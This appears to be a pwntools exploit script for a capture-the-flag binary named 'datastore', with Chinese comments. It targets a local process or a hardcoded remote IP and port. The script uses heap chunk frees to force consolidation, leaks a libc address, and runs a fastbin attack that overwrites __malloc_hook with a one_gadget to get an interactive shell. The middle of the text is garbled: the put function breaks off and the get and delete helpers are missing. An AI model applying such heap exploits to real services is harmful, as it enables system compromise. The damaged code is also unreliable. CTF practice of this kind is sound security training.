
```python
# -*-coding:utf-8 -*
from pwn import *
import sys

context.log_level = 'debug'
context.arch = 'amd64'
SigreturnFrame(kernel = 'amd64')

binary = "./datastore"

global p
local = 1
if local:
    p = process(binary)
    e = ELF(binary)
    libc = e.libc
else:
    p = remote("111.200.241.244","58782")
    e = ELF(binary)
    libc = e.libc
    #libc = ELF('./libc_32.so.6')

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
sa = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
uu32 = lambda data :u32(data.ljust(4, b'\0'))
uu64 = lambda data :u64(data.ljust(8, b'\0'))
u64Leakbase = lambda offset :u64(ru("\x7f")[-6: ] + b'\0\0') - offset
u32Leakbase = lambda offset :u32(ru("\xf7")[-4: ]) - offset
it = lambda :p.interactive()

def z(s='b main'):
 gdb.attach(p,s)

def success(string,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(string,addr))

def pa(s='暂停!'):
  log.success('当前执行步骤 -> '+str(s))
  pause()
one = [0x45206,0x4525a,0xcc673,0xcc748,0xefa00,0xf0897,0xf5e40,0xef9f4] #2.23
#one = [0x45226,0x4527a,0xcd173,0xcd248,0xf03a4,0xf03b0,0xf1247,0xf67f0]
#idx = int(sys.argv[1])

def put(a,b,c):
    sla("PROMPT: Enter command:\n",'PUT')
    sla("PROMPT: Enter row key:\n",a)
    sla("PROMPT: Enter data size:\n",str(b))
    if len(c) size
put('P',0x20,'P'*0x20)
#------------------------------
dele('a') #首先释放chunka 对于下面释放chunkc后发生向上合并的检查绕过
dele('b') #重新分配到key_ptr
dele(b'b'*0x1f0 +p64(0x4b0))
dele('c') #向上合并
#------------------------------
put('a',0x200,'A'*0x200)
get('e') #打印动态地址
ru('\n')
libc_base  = uu64(rc(6)) - (0x7f0eea245b78-0x7f0ee9e82000) 
malloc = libc_base + libc.symbols['__malloc_hook']
success('libc',libc_base)
success('malloc_hook',malloc)
#----------------------------
dele('d') #放入fast bin attack
put('f',0x40,b'f'*0x20 + p64(0) + p64(0x71) + p64(malloc-0x23))
put('g',0x60,b'g')
put('x',0x60,p8(0)*0x13 + p64(libc_base + one[1]))
#----------------------------
sla("PROMPT: Enter command:\n",'DEL')
it()
```
